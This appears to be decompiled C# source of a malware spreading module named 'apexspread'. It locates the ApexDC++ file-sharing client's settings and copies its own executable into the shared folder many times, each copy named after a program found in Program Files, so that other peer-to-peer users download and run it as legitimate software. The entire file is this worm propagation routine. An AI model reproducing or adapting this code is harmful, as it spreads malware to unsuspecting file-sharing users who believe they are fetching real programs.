using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication35;

[StandardModule]
public sealed class Apex
{
	public static void apexspread()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string destFileName = default(string);
		string text = default(string);
		string text2 = default(string);
		XmlTextReader xmlTextReader = default(XmlTextReader);
		string text3 = default(string);
		string folderPath = default(string);
		string[] directories = default(string[]);
		int num5 = default(int);
		string[] directories2 = default(string[]);
		int num6 = default(int);
		string text4 = default(string);
		string destFileName2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 592:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0026;
						case 4:
							goto IL_0040;
						case 5:
							goto IL_004a;
						case 6:
							goto IL_0054;
						case 9:
							goto IL_0060;
						case 10:
							goto IL_006b;
						case 12:
						case 13:
							goto IL_0077;
						case 14:
							goto IL_0087;
						case 15:
							goto IL_0092;
						case 7:
						case 8:
						case 16:
							goto IL_00ac;
						case 11:
						case 17:
							goto IL_00b7;
						case 18:
							goto IL_00bd;
						case 19:
							goto IL_00cc;
						case 20:
							goto IL_00d9;
						case 21:
							goto IL_00f2;
						case 22:
							goto IL_012a;
						case 23:
							goto IL_0141;
						case 24:
							goto IL_014d;
						case 25:
							goto IL_0166;
						case 26:
							goto IL_019e;
						case 27:
							goto IL_01b5;
						default:
							goto end_IL_0000;
						case 28:
						case 29:
						case 30:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00f2:
					num = 21;
					destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + ".exe";
					goto IL_012a;
					IL_0008:
					num = 2;
					if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ApexDC++\\DCPlusPlus.xml"))
					{
						goto end_IL_0000_2;
					}
					goto IL_0026;
					IL_0026:
					num = 3;
					xmlTextReader = new XmlTextReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ApexDC++\\DCPlusPlus.xml");
					goto IL_0040;
					IL_0040:
					num = 4;
					xmlTextReader.WhitespaceHandling = WhitespaceHandling.None;
					goto IL_004a;
					IL_004a:
					num = 5;
					xmlTextReader.Read();
					goto IL_0054;
					IL_0054:
					num = 6;
					xmlTextReader.Read();
					goto IL_00ac;
					IL_00ac:
					num = 8;
					if (!xmlTextReader.EOF)
					{
						goto IL_0060;
					}
					goto IL_00b7;
					IL_0060:
					num = 9;
					xmlTextReader.Read();
					goto IL_006b;
					IL_006b:
					num = 10;
					if (xmlTextReader.IsStartElement())
					{
						goto IL_0077;
					}
					goto IL_00b7;
					IL_0077:
					num = 13;
					xmlTextReader.GetAttribute("DCPlusPlus");
					goto IL_0087;
					IL_0087:
					num = 14;
					xmlTextReader.Read();
					goto IL_0092;
					IL_0092:
					num = 15;
					RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(xmlTextReader.ReadElementString("Directory")));
					goto IL_00ac;
					IL_00b7:
					num = 17;
					text = text3;
					goto IL_00bd;
					IL_00bd:
					num = 18;
					if (!Directory.Exists(text))
					{
						goto end_IL_0000_2;
					}
					goto IL_00cc;
					IL_00cc:
					num = 19;
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					goto IL_00d9;
					IL_00d9:
					num = 20;
					directories = Directory.GetDirectories(folderPath);
					num5 = 0;
					goto IL_0145;
					IL_0145:
					if (num5 < directories.Length)
					{
						text2 = directories[num5];
						goto IL_00f2;
					}
					goto IL_014d;
					IL_014d:
					num = 24;
					directories2 = Directory.GetDirectories(folderPath);
					num6 = 0;
					goto IL_01b9;
					IL_01b9:
					if (num6 < directories2.Length)
					{
						text4 = directories2[num6];
						goto IL_0166;
					}
					goto end_IL_0000_2;
					IL_0141:
					num = 23;
					goto IL_0145;
					IL_0166:
					num = 25;
					destFileName2 = text + "\\" + text4.Substring(text4.LastIndexOf("\\")).Replace("\\", string.Empty) + ".exe";
					goto IL_019e;
					IL_019e:
					num = 26;
					File.Copy(Application.get_ExecutablePath(), destFileName2, overwrite: true);
					num6 = checked(num6 + 1);
					goto IL_01b5;
					IL_01b5:
					num = 27;
					goto IL_01b9;
					IL_012a:
					num = 22;
					File.Copy(Application.get_ExecutablePath(), destFileName, overwrite: true);
					num5 = checked(num5 + 1);
					goto IL_0141;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 592;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
